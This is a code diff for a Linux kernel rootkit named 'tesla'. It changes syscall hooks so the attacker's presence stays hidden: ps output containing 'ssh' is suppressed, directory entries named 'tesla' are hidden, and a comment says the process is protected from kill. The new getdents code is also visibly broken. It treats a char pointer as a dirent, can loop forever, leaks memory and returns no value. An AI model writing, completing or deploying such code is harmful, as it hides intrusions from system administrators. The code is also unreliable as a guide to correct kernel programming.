@@ -26,7 +26,9 @@ asmlinkage long tesla_write(unsigned int fd, char __user *buf, size_t count)
 {
 	char *kbuf;
 	kbuf = kmalloc(count, GFP_KERNEL);
-	copy_from_user(kbuf, buf, count);
+	if (copy_from_user(kbuf, buf, count) != 0) {
+		return -EACCES;
+	}
 	if (strstr(kbuf, "ssh") && strstr(current->comm, "ps")) {
 		kfree(kbuf);
 		return count;
@@ -41,7 +43,24 @@ asmlinkage long tesla_write(unsigned int fd, char __user *buf, size_t count)
 
 asmlinkage long tesla_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
 {
-    return 0;
+    char *p1 = kmalloc(count, GFP_KERNEL);
+	char *p2 = kmalloc(count, GFP_KERNEL);
+	int ret = orig_dents(fd, dirp, count);
+	int i = 0;
+	if (copy_from_user(p1, dirp, count) != 0) {
+		return -EACCES;
+	}
+	p2 = p1;
+	while (i < ret) {
+		if (strstr(p2->d_name,"tesla")) {
+			memmove(p1, p2, p2->d_reclen);
+			ret -= p2->d_reclen;
+			i += p2->d_reclen;
+			p2 = (struct linux_dirent*)((char *)p2 + p2->d_reclen);
+		}
+		
+
+	}
 }
 
 /* we intercept kill so that our process can not be killed */
